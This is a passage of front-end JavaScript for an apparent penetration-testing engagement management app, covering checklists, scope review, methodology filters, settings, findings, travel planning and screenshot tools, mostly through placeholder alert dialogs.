            
            // Expenses table double-click
            document.querySelectorAll('#expensesTable .asset-row').forEach(row => {
                row.addEventListener('dblclick', function() {
                    const description = this.querySelector('td:nth-child(3) strong')?.textContent || 'Expense';
                    const amount = this.querySelector('td:nth-child(6)')?.textContent || '0.00';
                    const category = this.querySelector('.asset-type')?.textContent || 'Unknown';
                    openExpenseDetails(description, amount, category, this.dataset);
                });
            });
            
            // Documents table double-click
            document.querySelectorAll('#documentsTable .asset-row').forEach(row => {
                row.addEventListener('dblclick', function() {
                    const filename = this.querySelector('td:nth-child(2) strong')?.textContent || 'Document';
                    const size = this.querySelector('td:nth-child(4)')?.textContent || 'Unknown';
                    const category = this.querySelector('.asset-type')?.textContent || 'Unknown';
                    openDocumentDetails(filename, size, category, this.dataset);
                });
            });
        }
        
        // Detail modal functions
        function openAssetDetails(name, type, status, dataset) {
            alert(`Asset Details:\\n\\nName: ${name}\\nType: ${type}\\nStatus: ${status}\\n\\nDouble-click functionality working! This would open a detailed view modal.`);
        }
        
        function openTaskDetails(name, category, status, dataset) {
            alert(`Task Details:\\n\\nTask: ${name}\\nCategory: ${category}\\nStatus: ${status}\\n\\nDouble-click functionality working! This would open a detailed task editor.`);
        }
        
        function openContactDetails(name, role, email, dataset) {
            alert(`Contact Details:\\n\\nName: ${name}\\nRole: ${role}\\nEmail: ${email}\\n\\nDouble-click functionality working! This would open a detailed contact view.`);
        }
        
        function openCredentialDetails(username, type, status, dataset) {
            alert(`Credential Details:\\n\\nUsername: ${username}\\nType: ${type}\\nStatus: ${status}\\n\\nDouble-click functionality working! This would open a detailed credential manager.`);
        }
        
        function openHistoryDetails(time, event, category, dataset) {
            alert(`History Details:\\n\\nTime: ${time}\\nEvent: ${event}\\nCategory: ${category}\\n\\nDouble-click functionality working! This would open a detailed timeline view.`);
        }
        
        function openExpenseDetails(description, amount, category, dataset) {
            alert(`Expense Details:\\n\\nDescription: ${description}\\nAmount: ${amount}\\nCategory: ${category}\\n\\nDouble-click functionality working! This would open a detailed expense editor.`);
        }
        
        function openDocumentDetails(filename, size, category, dataset) {
            alert(`Document Details:\\n\\nFilename: ${filename}\\nSize: ${size}\\nCategory: ${category}\\n\\nDouble-click functionality working! This would open a detailed document viewer.`);
        }
        
        // Initialize double-click handlers when page loads
        document.addEventListener('DOMContentLoaded', function() {
            initializeDoubleClickHandlers();
            initializeChecklistFilters();
        });

        // Pre-Engagement Checklist Functions
        function toggleNotes(button) {
            const notesDiv = button.closest('.checklist-item').querySelector('.question-notes');
            if (notesDiv.style.display === 'none' || !notesDiv.style.display) {
                notesDiv.style.display = 'block';
                button.style.opacity = '1';
                button.style.background = 'var(--border-color)';
            } else {
                notesDiv.style.display = 'none';
                button.style.opacity = '0.6';
                button.style.background = 'none';
            }
        }

        function updateChecklistStatus(element) {
            const checklistItem = element.closest('.checklist-item');
            const statusIndicator = checklistItem.querySelector('.status-indicator');
            
            // Determine if the question is completed based on input type and value
            let isCompleted = false;
            
            if (element.type === 'date' || element.type === 'datetime-local') {
                isCompleted = element.value !== '';
            } else if (element.type === 'checkbox') {
                const checkboxes = checklistItem.querySelectorAll('input[type="checkbox"]');
                isCompleted = Array.from(checkboxes).some(cb => cb.checked);
            } else if (element.tagName.toLowerCase() === 'textarea') {
                isCompleted = element.value.trim() !== '';
            } else if (element.type === 'number') {
                isCompleted = element.value !== '' && parseInt(element.value) > 0;
            } else {
                isCompleted = element.value.trim() !== '';
            }
            
            // Update status indicator and data attribute
            if (isCompleted) {
                statusIndicator.className = 'status-indicator completed';
                statusIndicator.textContent = '';
                checklistItem.dataset.status = 'completed';
            } else {
                statusIndicator.className = 'status-indicator in-progress';
                statusIndicator.textContent = '';
                checklistItem.dataset.status = 'in-progress';
            }
            
            updateChecklistProgress();
        }

        function updateChecklistProgress() {
            const allItems = document.querySelectorAll('.checklist-item');
            const completed = document.querySelectorAll('.checklist-item[data-status="completed"]').length;
            const inProgress = document.querySelectorAll('.checklist-item[data-status="in-progress"]').length;
            const blocked = document.querySelectorAll('.checklist-item[data-status="blocked"]').length;
            const pending = allItems.length - completed - inProgress - blocked;
            
            // Update progress display
            document.querySelector('.progress-stat.completed .stat-number').textContent = completed;
            document.querySelector('.progress-stat.progress .stat-number').textContent = inProgress;
            document.querySelector('.progress-stat.blocked .stat-number').textContent = blocked;
            
            // Update total count
            document.querySelector('.checklist-progress').previousElementSibling.textContent = 
                `Pre-Engagement Checklist (${allItems.length} Questions)`;
        }

        function linkContact(button) {
            const input = button.previousElementSibling;
            if (input.value.trim() === '') {
                alert('Please enter a contact name first');
                return;
            }
            
            // Simulate linking to contacts database
            alert(`Contact "${input.value}" would be linked to the main contacts database for easy reference.`);
            
            // Mark as completed since contact has been linked
            updateChecklistStatus(input);
        }

        // Contact database - in a real app this would come from a database
        const contactsDatabase = {
            'sarah-johnson': {
                name: 'Sarah Johnson',
                role: 'CISO',
                email: 'sarah.johnson@acmecorp.com',
                phone: '+44 7700 900123',
                department: 'Security'
            },
            'david-chen': {
                name: 'David Chen',
                role: 'Security Operations Manager',
                email: 'david.chen@acmecorp.com',
                phone: '+44 7700 900456',
                department: 'Security Operations'
            },
            'michael-brown': {
                name: 'Michael Brown',
                role: 'IT Director',
                email: 'michael.brown@acmecorp.com',
                phone: '+44 7700 900789',
                department: 'IT'
            },
            'emma-davis': {
                name: 'Emma Davis',
                role: 'Compliance Manager',
                email: 'emma.davis@acmecorp.com',
                phone: '+44 7700 900012',
                department: 'Compliance'
            },
            'james-wilson': {
                name: 'James Wilson',
                role: 'Network Administrator',
                email: 'james.wilson@acmecorp.com',
                phone: '+44 7700 900345',
                department: 'IT Operations'
            }
        };

        function selectContact(selectElement) {
            const contactId = selectElement.value;
            const contactRole = selectElement.dataset.contactRole;
            const displayElement = document.getElementById(`contact-display-${contactRole}`);
            
            if (contactId && contactsDatabase[contactId]) {
                const contact = contactsDatabase[contactId];
                
                // Update display
                const values = displayElement.querySelectorAll('.contact-detail-value');
                values[0].textContent = contact.name;
                values[1].textContent = contact.role;
                values[2].textContent = contact.email;
                values[3].textContent = contact.phone;
                
                displayElement.classList.add('show');
                updateChecklistStatus(selectElement);
            } else {
                displayElement.classList.remove('show');
            }
        }

        function selectContactForReports(selectElement) {
            // Just update the checklist status for reports
            updateChecklistStatus(selectElement);
        }

        function showAddContactModal(contactRole) {
            // In a real app, this would open a modal to add a new contact
            const name = prompt('Enter contact name:');
            if (name) {
                const email = prompt('Enter contact email:');
                const phone = prompt('Enter contact phone:');
                const role = prompt('Enter contact role:');
                
                if (name && email) {
                    // Simulate adding to database and updating select options
                    alert(`New contact "${name}" would be added to the database and available in the dropdown.\\n\\nIn a real application, this would:\\n- Open a proper contact creation modal\\n- Validate the information\\n- Save to database\\n- Update all contact dropdowns`);
                }
            }
        }

        function jumpToContacts() {
            // Navigate to contacts section
            showSection('contacts');
            alert('Navigated to Contacts section where you can view and manage all contacts.');
        }

        function addContactToReports(button) {
            const container = button.parentNode;
            const newEntry = document.createElement('div');
            newEntry.className = 'contact-entry';
            newEntry.innerHTML = `
                <select class="contact-select" onchange="selectContactForReports(this)">
                    <option value="">Select contact...</option>
                    <option value="sarah-johnson">Sarah Johnson - CISO</option>
                    <option value="david-chen">David Chen - Security Operations Manager</option>
                    <option value="michael-brown">Michael Brown - IT Director</option>
                    <option value="emma-davis">Emma Davis - Compliance Manager</option>
                    <option value="james-wilson">James Wilson - Network Administrator</option>
                </select>
                <select onchange="updateChecklistStatus(this)">
                    <option value="executive">Executive Summary</option>
                    <option value="technical">Technical Report</option>
                    <option value="both">Both Reports</option>
                </select>
                <button class="remove-contact" onclick="removeContact(this)" title="Remove"></button>
            `;
            
            container.insertBefore(newEntry, button);
        }

        function removeContact(button) {
            const entry = button.parentNode;
            const container = entry.parentNode;
            
            // Don't remove if it's the last entry
            if (container.querySelectorAll('.contact-entry').length > 1) {
                entry.remove();
                // Update checklist status after removal
                const firstSelect = container.querySelector('select');
                if (firstSelect) {
                    updateChecklistStatus(firstSelect);
                }
            } else {
                alert('You must have at least one contact for report distribution.');
            }
        }

        function initializeChecklistFilters() {
            // Add event listeners to filter buttons if they exist
            const filterButtons = document.querySelectorAll('.checklist-filters .filter-btn');
            filterButtons.forEach(button => {
                button.addEventListener('click', function() {
                    // Remove active class from all buttons
                    filterButtons.forEach(btn => btn.classList.remove('active'));
                    // Add active class to clicked button
                    this.classList.add('active');
                    
                    const filterType = this.textContent.toLowerCase().trim();
                    filterChecklistItems(filterType);
                });
            });
        }

        function filterChecklistItems(filterType) {
            const sections = document.querySelectorAll('.checklist-section');
            
            sections.forEach(section => {
                const sectionType = section.querySelector('.section-header').textContent.toLowerCase();
                const items = section.querySelectorAll('.checklist-item');
                
                if (filterType === 'all') {
                    section.style.display = 'block';
                    items.forEach(item => item.style.display = 'block');
                } else if (filterType.includes(sectionType) || sectionType.includes(filterType)) {
                    section.style.display = 'block';
                    items.forEach(item => item.style.display = 'block');
                } else {
                    // Check if any items match the status filter
                    let hasMatchingItems = false;
                    items.forEach(item => {
                        if (item.dataset.status === filterType || filterType === 'completed' && item.dataset.status === 'completed') {
                            item.style.display = 'block';
                            hasMatchingItems = true;
                        } else if (filterType === 'pending' && (!item.dataset.status || item.dataset.status === 'pending')) {
                            item.style.display = 'block';
                            hasMatchingItems = true;
                        } else {
                            item.style.display = 'none';
                        }
                    });
                    
                    section.style.display = hasMatchingItems ? 'block' : 'none';
                }
            });
        }

        function updateTeamCount() {
            const teamInputs = document.querySelectorAll('.team-role-input input[type="number"]');
            let total = 0;
            teamInputs.forEach(input => {
                total += parseInt(input.value) || 0;
            });
            
            const totalDisplay = document.querySelector('.team-total');
            if (totalDisplay) {
                totalDisplay.textContent = `Total Team Members: ${total}`;
            }
        }

        function reviewScope(scopeType) {
            // In a real app, this would open the scope screen filtered by type
            let message = '';
            switch(scopeType) {
                case 'external':
                    message = 'External Scope Review:\\n\\n 192.168.1.0/24 Network Range\\n mail.acmecorp.com (Exchange Server)\\n vpn.acmecorp.com (VPN Gateway)\\n\\nNavigating to Scope screen...';
                    break;
                case 'internal':
                    message = 'Internal Scope Review:\\n\\n 10.0.1.0/24 Internal Network\\n dc01.internal.acme (Domain Controller)\\n\\nNavigating to Scope screen...';
                    break;
                case 'webapp':
                    message = 'Web Application Scope Review:\\n\\n https://portal.acmecorp.com\\n\\nNavigating to Scope screen...';
                    break;
            }
            alert(message);
            showSection('scope');
        }

        function openScopeManager() {
            // Navigate to scope section
            showSection('scope');
            alert('Navigated to Scope screen where you can add, edit, and manage all testing targets.');
        }

        // Methodology Functions
        function addNewAction() {
            alert('Add New Action\\n\\nThis would open a modal to create a custom testing action with:\\n- Action name and description\\n- Testing category and phase\\n- Required tools and techniques\\n- Estimated time\\n- Prerequisites and dependencies');
        }

        function importMethodology() {
            alert('Import Methodology Template\\n\\nThis would allow importing from:\\n- OWASP Testing Guide\\n- NIST Framework\\n- PTES (Penetration Testing Execution Standard)\\n- Custom saved templates\\n- Industry-specific methodologies');
        }

        function filterActions(filterType) {
            const phases = document.querySelectorAll('.methodology-phase');
            const actions = document.querySelectorAll('.action-item');
            
            // Remove active class from all filter buttons
            document.querySelectorAll('.methodology-controls .filter-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            
            // Add active class to clicked button
            event.target.classList.add('active');
            
            if (filterType === 'all') {
                phases.forEach(phase => phase.style.display = 'block');
                actions.forEach(action => action.style.display = 'block');
                return;
            }
            
            // Filter by category
            if (['reconnaissance', 'scanning', 'enumeration', 'exploitation', 'post-exploitation'].includes(filterType)) {
                phases.forEach(phase => {
                    const phaseType = phase.dataset.phase;
                    if (phaseType === filterType) {
                        phase.style.display = 'block';
                    } else {
                        phase.style.display = 'none';
                    }
                });
                return;
            }
            
            // Filter by status
            phases.forEach(phase => {
                let hasVisibleActions = false;
                const phaseActions = phase.querySelectorAll('.action-item');
                
                phaseActions.forEach(action => {
                    if (action.dataset.status === filterType) {
                        action.style.display = 'block';
                        hasVisibleActions = true;
                    } else {
                        action.style.display = 'none';
                    }
                });
                
                phase.style.display = hasVisibleActions ? 'block' : 'none';
            });
        }

        function searchActions() {
            const searchTerm = document.getElementById('actionSearch').value.toLowerCase();
            const actions = document.querySelectorAll('.action-item');
            const phases = document.querySelectorAll('.methodology-phase');
            
            actions.forEach(action => {
                const title = action.querySelector('.action-title').textContent.toLowerCase();
                const description = action.querySelector('.action-description').textContent.toLowerCase();
                const tool = action.querySelector('.action-tool').textContent.toLowerCase();
                const techniques = Array.from(action.querySelectorAll('.technique-tag'))
                    .map(tag => tag.textContent.toLowerCase()).join(' ');
                
                const matches = title.includes(searchTerm) || 
                               description.includes(searchTerm) ||
                               tool.includes(searchTerm) ||
                               techniques.includes(searchTerm);
                
                action.style.display = matches ? 'block' : 'none';
            });
            
            // Show/hide phases based on visible actions
            phases.forEach(phase => {
                const visibleActions = phase.querySelectorAll('.action-item[style*="block"], .action-item:not([style*="none"])');
                const hasVisible = Array.from(visibleActions).some(action => 
                    !action.style.display || action.style.display === 'block'
                );
                phase.style.display = hasVisible ? 'block' : 'none';
            });
        }

        // Action Modal Functions
        function openActionModal(actionId) {
            console.log('Opening action modal for:', actionId);
            const modal = document.getElementById('actionModalOverlay');
            
            if (!modal) {
                console.error('Modal not found!');
                alert('Modal not found in DOM!');
                return;
            }
            
            // Force the modal to show with explicit style
            modal.style.display = 'flex';
            modal.style.visibility = 'visible';
            modal.style.opacity = '1';
            modal.classList.add('show');
            
            // In a real app, this would load action-specific data
            // For now, we'll just show the modal with the Port Scanning example
        }

        function closeActionModal() {
            const modal = document.getElementById('actionModalOverlay');
            modal.style.display = 'none';
            modal.style.visibility = 'hidden';
            modal.style.opacity = '0';
            modal.classList.remove('show');
        }

        function switchModalTab(tabName) {
            // Hide all tabs
            document.querySelectorAll('.modal-tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Hide all nav buttons
            document.querySelectorAll('.modal-nav-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            
            // Show selected tab
            document.getElementById('tab-' + tabName).classList.add('active');
            document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');
        }

        function copyToClipboard(elementId) {
            const element = document.getElementById(elementId);
            const text = element.querySelector('code').textContent;
            navigator.clipboard.writeText(text).then(function() {
                // Show temporary feedback
                const btn = element.parentNode.querySelector('.copy-btn');
                const originalText = btn.innerHTML;
                btn.innerHTML = ' Copied!';
                btn.style.background = 'var(--success)';
                
                setTimeout(() => {
                    btn.innerHTML = originalText;
                    btn.style.background = 'var(--primary-color)';
                }, 2000);
            });
        }

        function toggleIssue(issueId) {
            const content = document.getElementById(issueId);
            const toggle = content.previousElementSibling.querySelector('.issue-toggle');
            
            if (content.style.display === 'block') {
                content.style.display = 'none';
                toggle.textContent = '+';
            } else {
                content.style.display = 'block';
                toggle.textContent = '-';
            }
        }

        function useTemplate(templateId) {
            alert(`Using template: ${templateId}\\n\\nThis would automatically create a new finding based on the template and add it to the current session findings.`);
        }

        function copyCleanupCommand(cleanupId) {
            const item = document.getElementById(cleanupId).parentNode;
            const command = item.querySelector('code').textContent;
            
            navigator.clipboard.writeText(command).then(function() {
                const btn = item.querySelector('.copy-btn');
                const originalText = btn.innerHTML;
                btn.innerHTML = ' Copied!';
                btn.style.background = 'var(--success)';
                
                setTimeout(() => {
                    btn.innerHTML = originalText;
                    btn.style.background = 'var(--primary-color)';
                }, 2000);
            });
        }

        function exportActionReport() {
            alert('Export Action Report\\n\\nThis would generate a detailed report for this specific action including:\\n- Command templates used\\n- Findings discovered\\n- Issues encountered\\n- Cleanup steps completed\\n- Time tracking and notes');
        }
        
        // Settings Page Functions
        function showSettingsSection(sectionName) {
            // Hide all sections
            document.querySelectorAll('.settings-section').forEach(section => {
                section.classList.remove('active');
            });
            
            // Remove active from all nav buttons
            document.querySelectorAll('.settings-nav-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            
            // Show selected section
            document.getElementById('settings-' + sectionName).classList.add('active');
            
            // Add active to clicked nav button
            event.target.classList.add('active');
        }
        
        function applyTheme(theme) {
            const body = document.body;
            const themeIcon = document.getElementById('themeIcon');
            const themeText = document.querySelector('.theme-text');
            
            if (theme === 'auto') {
                const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                theme = prefersDark ? 'dark' : 'light';
            }
            
            body.setAttribute('data-theme', theme);
            
            if (theme === 'dark') {
                themeIcon.textContent = '';
                themeText.textContent = 'Light';
            } else {
                themeIcon.textContent = '';
                themeText.textContent = 'Dark';
            }
            
            updateSaveStatus('Settings updated');
        }
        
        function setAccentColor(color) {
            document.documentElement.style.setProperty('--primary-color', color);
            updateSaveStatus('Accent color updated');
        }
        
        function setFontSize(size) {
            document.documentElement.style.setProperty('--font-size-base', size + 'px');
            const rangeValue = event.target.nextElementSibling;
            if (rangeValue) {
                rangeValue.textContent = size + 'px';
            }
            updateSaveStatus('Font size updated');
        }
        
        function toggleCompactMode(enabled) {
            const body = document.body;
            if (enabled) {
                body.classList.add('compact-mode');
            } else {
                body.classList.remove('compact-mode');
            }
            updateSaveStatus('Compact mode ' + (enabled ? 'enabled' : 'disabled'));
        }
        
        function updateSaveStatus(message) {
            const statusText = document.querySelector('.status-text');
            const statusIndicator = document.querySelector('.status-indicator');
            
            if (statusText && statusIndicator) {
                statusText.textContent = message;
                statusIndicator.style.background = '#ffc107';
                
                setTimeout(() => {
                    statusText.textContent = 'All changes saved';
                    statusIndicator.style.background = '#28a745';
                }, 2000);
            }
        }
        
        function saveSettings() {
            // In a real app, this would save settings to backend
            updateSaveStatus('All settings saved successfully');
            
            // Show temporary success message
            const saveBtn = event.target;
            const originalText = saveBtn.textContent;
            saveBtn.textContent = 'Saved!';
            saveBtn.style.background = '#28a745';
            
            setTimeout(() => {
                saveBtn.textContent = originalText;
                saveBtn.style.background = '';
            }, 2000);
        }
        
        function resetSettings() {
            if (confirm('Are you sure you want to reset all settings to defaults? This cannot be undone.')) {
                // Reset theme
                document.body.setAttribute('data-theme', 'light');
                document.getElementById('themeIcon').textContent = '';
                document.querySelector('.theme-text').textContent = 'Dark';
                
                // Reset accent color
                document.documentElement.style.removeProperty('--primary-color');
                
                // Reset font size
                document.documentElement.style.removeProperty('--font-size-base');
                const rangeInput = document.querySelector('.range-input');
                if (rangeInput) {
                    rangeInput.value = 16;
                    rangeInput.nextElementSibling.textContent = '16px';
                }
                
                // Reset compact mode
                document.body.classList.remove('compact-mode');
                
                // Reset all checkboxes and form inputs
                document.querySelectorAll('.settings-section input[type="checkbox"]').forEach(cb => {
                    cb.checked = false;
                });
                
                document.querySelectorAll('.settings-section select').forEach(select => {
                    select.selectedIndex = 0;
                });
                
                updateSaveStatus('Settings reset to defaults');
            }
        }
        
        // Integration configuration functions
        function configureIntegration(integrationName) {
            alert(`Configure ${integrationName} Integration\\n\\nThis would open a configuration modal for:\\n- API credentials\\n- Webhook URLs\\n- Event subscriptions\\n- Field mappings\\n- Test connection`);
        }
        
        // API key management functions
        function generateApiKey() {
            if (confirm('Generate a new API key? This will create a new key with full access permissions.')) {
                const newKey = 'mad_key_' + Math.random().toString(36).substring(2, 15);
                alert(`New API Key Generated:\\n\\n${newKey}\\n\\nPlease save this key securely. It will not be shown again.`);
                updateSaveStatus('New API key generated');
            }
        }
        
        function revokeApiKey(keyName) {
            if (confirm(`Are you sure you want to revoke the "${keyName}" API key? This action cannot be undone and may break existing integrations.`)) {
                alert(`API key "${keyName}" has been revoked.`);
                updateSaveStatus('API key revoked');
            }
        }
        
        // Webhook management functions
        function addWebhook() {
            alert('Add New Webhook\\n\\nThis would open a form to configure:\\n- Webhook URL\\n- Event types to subscribe to\\n- Authentication method\\n- Retry policy\\n- Test webhook delivery');
        }
        
        function editWebhook(webhookUrl) {
            alert(`Edit Webhook\\n\\nURL: ${webhookUrl}\\n\\nThis would open the webhook configuration editor.`);
        }
        
        function deleteWebhook(webhookUrl) {
            if (confirm(`Delete webhook ${webhookUrl}?\\n\\nThis will stop all event notifications to this endpoint.`)) {
                alert('Webhook deleted successfully.');
                updateSaveStatus('Webhook removed');
            }
        }
        
        // Backup functions
        function startBackup() {
            if (confirm('Start immediate backup of all project data?\\n\\nThis may take several minutes depending on data size.')) {
                alert('Backup Started\\n\\n Project data\\n User settings\\n Files and screenshots\\n Generating archive...\\n\\nYou will be notified when the backup is complete.');
                updateSaveStatus('Backup in progress...');
            }
        }
        
        function exportData() {
            alert('Export Project Data\\n\\nChoose format:\\n JSON (complete data with metadata)\\n CSV (tabular data for analysis)\\n XML (structured export)\\n\\nThis would open a format selection dialog.');
        }
        
        function importData() {
            alert('Import Project Data\\n\\nSupported formats:\\n Madness backup files (.mad)\\n JSON exports\\n CSV data files\\n Nessus files (.nessus)\\n Burp Suite files\\n\\nThis would open a file picker dialog.');
        }
        
        // Danger zone functions
        function resetAllSettings() {
            const confirmed = confirm(' DANGER: Reset All Settings\\n\\nThis will:\\n Reset all preferences to defaults\\n Clear all API keys and webhooks\\n Remove all integrations\\n Reset interface customizations\\n\\nProject data will NOT be affected.\\n\\nAre you absolutely sure?');
            
            if (confirmed) {
                const doubleConfirm = confirm('This action cannot be undone.\\n\\nType "RESET" to confirm you want to reset all settings.');
                if (doubleConfirm) {
                    alert('All settings have been reset to defaults.\\n\\nThe page will reload to apply changes.');
                    // In real app: resetAllSettings(), then reload
                    setTimeout(() => location.reload(), 2000);
                }
            }
        }
        
        function clearAllData() {
            const confirmed = confirm(' EXTREME DANGER: Clear All Data\\n\\nThis will PERMANENTLY DELETE:\\n All projects and findings\\n All uploaded files and screenshots\\n All credentials and assets\\n All reports and documentation\\n All user settings and preferences\\n\\nTHIS CANNOT BE UNDONE!\\n\\nAre you absolutely sure?');
            
            if (confirmed) {
                const verification = prompt('This will delete EVERYTHING.\\n\\nType "DELETE ALL DATA" to confirm:');
                if (verification === 'DELETE ALL DATA') {
                    alert('All data deletion initiated.\\n\\nThis process will take a few moments.\\n\\nThe application will restart when complete.');
                    // In real app: clearAllData(), then redirect to setup
                } else {
                    alert('Data deletion cancelled. Verification text did not match.');
                }
            }
        }
        
        // Findings Management Functions
        function exportFindings() {
            alert('Export Findings\\n\\nChoose export format:\\n PDF Report\\n Excel Spreadsheet\\n JSON Data\\n CSV File\\n XML Format\\n\\nThis would open a format selection dialog.');
        }
        
        function generateReport() {
            alert('Generate Report\\n\\nReport Types Available:\\n Executive Summary\\n Technical Details Report\\n Remediation Guide\\n Risk Assessment\\n Compliance Mapping\\n\\nThis would open the report generation wizard.');
        }
        
        function addFinding() {
            alert('Add New Finding\\n\\nThis would open a comprehensive finding editor with:\\n Severity classification\\n CVSS scoring\\n Affected systems\\n Technical details\\n Remediation steps\\n Evidence attachments');
        }
        
        function editFinding(findingId) {
            alert(`Edit Finding ${findingId}\\n\\nThis would open the finding editor with current data loaded for modification.`);
        }
        
        function duplicateFinding(findingId) {
            alert(`Duplicate Finding ${findingId}\\n\\nThis would create a copy of the finding with a new ID, allowing for quick creation of similar findings.`);
        }
        
        function exportFinding(findingId) {
            alert(`Export Finding ${findingId}\\n\\nExport options:\\n PDF Document\\n Word Document\\n Plain Text\\n JSON Data\\n\\nThis would generate a standalone finding report.`);
        }
        
        function deleteFinding(findingId) {
            if (confirm(`Delete Finding ${findingId}?\\n\\nThis will permanently remove this finding from the project. This action cannot be undone.\\n\\nAre you sure you want to proceed?`)) {
                alert(`Finding ${findingId} has been deleted.`);
                // In real app: remove from DOM and update backend
            }
        }
        
        // Travel & Hotels Functions
        let journeySegments = [];
        
        function showTravelSection(section) {
            // Update button states
            const buttons = document.querySelectorAll('.assets-filters button.filter-btn');
            buttons.forEach(btn => {
                if (btn.textContent.toLowerCase().includes(section.toLowerCase())) {
                    btn.style.background = 'var(--button-primary)';
                    btn.style.color = 'white';
                } else {
                    btn.style.background = '';
                    btn.style.color = '';
                }
            });
            
            // In real app: show/hide different sections
            console.log('Showing travel section:', section);
        }
        
        function toggleHotelFields(show) {
            const hotelFields = document.getElementById('hotelFields');
            if (hotelFields) {
                hotelFields.style.display = show ? 'block' : 'none';
            }
        }
        
        function addJourneySegment() {
            openModal('addJourneySegmentModal');
        }
        
        function updateTransportFields() {
            const transportType = document.getElementById('transportType').value;
            const trainFields = document.getElementById('trainFields');
            
            if (trainFields) {
                trainFields.style.display = (transportType === 'train' || transportType === 'plane') ? 'block' : 'none';
            }
        }
        
        function saveJourneySegment() {
            const segment = {
                type: document.getElementById('transportType').value,
                from: document.getElementById('segmentFrom').value,
                to: document.getElementById('segmentTo').value,
                date: document.getElementById('segmentDate').value,
                time: document.getElementById('segmentTime').value,
                duration: document.getElementById('duration').value,
                cost: document.getElementById('cost').value,
                status: document.getElementById('segmentStatus').value
            };
            
            if (segment.type === 'train' || segment.type === 'plane') {
                segment.platform = document.getElementById('platform').value;
                segment.seatInfo = document.getElementById('seatInfo').value;
                segment.bookingRef = document.getElementById('bookingRef').value;
            }
            
            journeySegments.push(segment);
            displayJourneySegments();
            closeModal('addJourneySegmentModal');
            
            // Clear form
            document.getElementById('addJourneySegmentModal').querySelectorAll('input, select, textarea').forEach(input => {
                input.value = '';
            });
        }
        
        function displayJourneySegments() {
            const container = document.getElementById('journeySegments');
            if (!container) return;
            
            const icons = {
                train: '',
                plane: '',
                tube: '',
                taxi: '',
                car: '',
                bus: '',
                walk: ''
            };
            
            container.innerHTML = journeySegments.map((segment, index) => `
                <div style="display: flex; align-items: center; gap: 0.5rem; padding: 0.75rem; background: var(--bg-secondary); border-radius: 6px; margin-bottom: 0.5rem;">
                    <span style="font-size: 1.25rem;">${icons[segment.type] || ''}</span>
                    <div style="flex: 1;">
                        <strong>${segment.from}  ${segment.to}</strong>
                        <div style="font-size: 0.875rem; color: var(--text-secondary);">
                            ${segment.date} at ${segment.time} | ${segment.duration} | ${segment.cost}
                        </div>
                    </div>
                    <button type="button" class="table-btn danger" onclick="removeJourneySegment(${index})" title="Remove"></button>
                </div>
            `).join('');
        }
        
        function removeJourneySegment(index) {
            journeySegments.splice(index, 1);
            displayJourneySegments();
        }
        
        function createTrip() {
            // Collect all form data
            const tripData = {
                engagementName: document.querySelector('#newTripModal input[placeholder*="engagement"]').value,
                targetLocation: document.querySelector('#newTripModal input[placeholder*="client site"]').value,
                startDate: document.querySelector('#newTripModal input[type="date"]').value,
                endDate: document.querySelectorAll('#newTripModal input[type="date"]')[1].value,
                homeLocation: document.querySelector('#newTripModal input[placeholder*="starting location"]').value,
                hotelRequired: document.querySelector('#newTripModal input[name="hotelRequired"]:checked')?.value,
                segments: journeySegments
            };
            
            if (tripData.hotelRequired === 'yes') {
                tripData.hotel = {
                    name: document.getElementById('hotelName').value,
                    address: document.getElementById('hotelAddress').value,
                    checkinDate: document.getElementById('checkinDate').value,
                    checkoutDate: document.getElementById('checkoutDate').value
                };
            }
            
            console.log('Creating trip:', tripData);
            alert('Trip created successfully!\\n\\nYour journey itinerary has been saved and can be viewed in the Travel & Hotels section.');
            
            // Reset form and close modal
            journeySegments = [];
            closeModal('newTripModal');
        }
        
        function viewFullItinerary() {
            alert('Full Itinerary View\\n\\nThis would display a comprehensive view of your entire trip including:\\n All journey segments with times\\n Hotel booking details\\n Daily commute options\\n Important contacts\\n Expense tracking\\n Documents and tickets');
        }
        
        function exportItinerary() {
            alert('Export Itinerary\\n\\nExport options:\\n PDF with all journey details\\n Calendar file (.ics)\\n Mobile-friendly format\\n Email summary\\n Print-ready version');
        }
        
        function uploadDocument() {
            alert('Upload Travel Document\\n\\nSupported formats:\\n PDF (tickets, bookings)\\n Images (JPG, PNG)\\n Documents (DOC, DOCX)\\n Emails (.eml, .msg)\\n\\nDrag and drop or click to browse');
        }
        
        // Screenshot Management Functions
        let currentTool = 'select';
        let layers = [];
        let currentLayer = null;
        let isSnapping = true;
        let showGrid = false;
        let showGuides = true;
        
        function filterScreenshots(filter) {
            console.log('Filtering screenshots by:', filter);
            // Update filter button states
            document.querySelectorAll('.filter-btn').forEach(btn => {
                if (btn.textContent.toLowerCase().includes(filter)) {
                    btn.classList.add('active');
                    btn.style.background = 'var(--button-primary)';
                    btn.style.color = 'white';
                } else if (btn.onclick && btn.onclick.toString().includes('filterScreenshots')) {
                    btn.classList.remove('active');
                    btn.style.background = '';
                    btn.style.color = '';
                }
            });
        }
        
        function searchScreenshots() {
            const searchTerm = document.getElementById('screenshotSearch').value.toLowerCase();
            console.log('Searching screenshots for:', searchTerm);
        }
        
        function setScreenshotView(view) {
            console.log('Setting screenshot view to:', view);
            document.querySelectorAll('.filter-btn').forEach(btn => {
                if (btn.textContent.toLowerCase().includes(view)) {
                    btn.style.background = 'var(--button-primary)';
                    btn.style.color = 'white';
                } else if (btn.onclick && btn.onclick.toString().includes('setScreenshotView')) {
                    btn.style.background = '';
                    btn.style.color = '';
                }
            });
        }
        
        function sortScreenshots(sortBy) {
            console.log('Sorting screenshots by:', sortBy);
        }
        
        function openScreenshotEditor(screenshotId) {
            document.getElementById('editorScreenshotId').textContent = screenshotId;
            openModal('screenshotEditorModal');
            initializeCanvas();
        }
        
        function cloneScreenshot(screenshotId) {
            const newId = 'SCR-' + String(Math.floor(Math.random() * 1000)).padStart(3, '0');
            alert(`Cloning Screenshot ${screenshotId}\\n\\nNew screenshot created: ${newId}\\n\\nAll properties and edits have been copied to the new screenshot.`);
        }
        
        function downloadScreenshot(screenshotId) {
            alert(`Downloading ${screenshotId}\\n\\nOptions:\\n Original image\\n Edited version\\n With annotations\\n Without sensitive data`);
        }
        
        function showScreenshotMenu(screenshotId) {
            alert(`Screenshot Options for ${screenshotId}\\n\\n Edit metadata\\n Change findings\\n Update instructions\\n View history\\n Share link\\n Delete`);
        }
        
        function exportScreenshots() {
